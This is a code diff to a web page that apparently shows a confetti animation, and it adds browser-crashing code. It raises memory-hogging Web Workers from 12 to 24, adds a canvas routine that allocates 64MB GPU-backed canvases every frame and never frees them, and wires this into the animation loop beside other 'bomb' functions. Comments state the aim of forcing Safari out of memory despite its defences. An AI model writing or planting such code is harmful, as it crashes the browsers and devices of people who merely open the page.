@@ -324,24 +324,24 @@
     // Workers have their own memory and CPU — not blocked by main thread freeze
     let workers = [];
     const WORKER_CODE = `
-        // Tight loop — no delays, allocates as fast as the CPU can go
-        // No setInterval, no setTimeout — browser cannot throttle this
         const junk = [];
+        // Try to grab 1GB immediately before Safari can react, then keep going
+        for (let size = 1024; size >= 1; size = Math.floor(size / 2)) {
+            try { while(true) junk.push(new Uint8Array(size * 1024 * 1024).fill(255)); }
+            catch(e) {}
+        }
+        // Keep hammering smaller chunks forever
         while (true) {
-            try {
-                junk.push(new Uint8Array(300 * 1024 * 1024).fill(255)); // 300MB per hit
-            } catch(e) {
-                // OOM error thrown — keep hammering anyway
-                try { junk.push(new Uint8Array(50 * 1024 * 1024).fill(255)); } catch(e2) {}
-            }
+            try { junk.push(new Uint8Array(50 * 1024 * 1024).fill(255)); }
+            catch(e) { try { junk.push(new Uint8Array(5 * 1024 * 1024).fill(255)); } catch(e2) {} }
         }
     `;
 
     function startWorkerBombs() {
         const blob = new Blob([WORKER_CODE], { type: 'application/javascript' });
         const url  = URL.createObjectURL(blob);
-        // Spawn 12 workers — Safari needs more pressure to actually OOM
-        for (let i = 0; i < 12; i++) {
+        // 24 workers — Safari kills them individually so need overwhelming numbers
+        for (let i = 0; i < 24; i++) {
             workers.push(new Worker(url));
         }
     }
@@ -383,6 +383,23 @@
     function stopIntervalBombs() {
         intervalBombs.forEach(clearInterval);
         intervalBombs = [];
+    }
+
+    // ── CANVAS GPU BOMB — Safari uses GPU memory for canvas backing store ────
+    // This hits a completely different memory pool than JS heap
+    const canvasJunk = [];
+    function canvasBomb() {
+        // Each 4096x4096 canvas = 64MB of GPU memory. Never freed.
+        for (let i = 0; i < 5; i++) {
+            try {
+                const c = document.createElement('canvas');
+                c.width = 4096; c.height = 4096;
+                const cx = c.getContext('2d');
+                cx.fillStyle = `hsl(${Math.random()*360},70%,50%)`;
+                cx.fillRect(0, 0, 4096, 4096);
+                canvasJunk.push(c);
+            } catch(e) {}
+        }
     }
 
     // ── DOM BOMB — creates DOM elements every frame, never removes them ───────
@@ -492,6 +509,7 @@
         heavyPhysics();
         domBomb(elapsedTime);
         memBomb(elapsedTime);
+        canvasBomb();
         sortBomb(confettiParticles.length);
         jsonBomb(); jsonBomb();         // run twice per frame
         imageDataBomb(); imageDataBomb(); // run twice per frame
